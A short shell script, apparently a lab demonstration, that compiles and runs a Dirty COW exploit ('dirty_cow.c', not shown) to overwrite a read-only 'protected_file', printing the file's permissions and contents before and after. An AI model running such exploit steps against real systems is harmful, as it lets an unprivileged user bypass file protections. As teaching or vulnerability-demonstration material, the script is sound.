
echo -e "\nProtected file permissions:"
ls -lah protected_file
echo -e "\nContents of protected_file:"
cat protected_file
echo -e ""

gcc -pthread -o dirty_cow dirty_cow.c
./dirty_cow protected_file Overwritten!

echo -e "\n\nProtected file permissions:"
ls -lah protected_file
echo -e "\nContents of protected_file:"
cat protected_file
echo -e ""


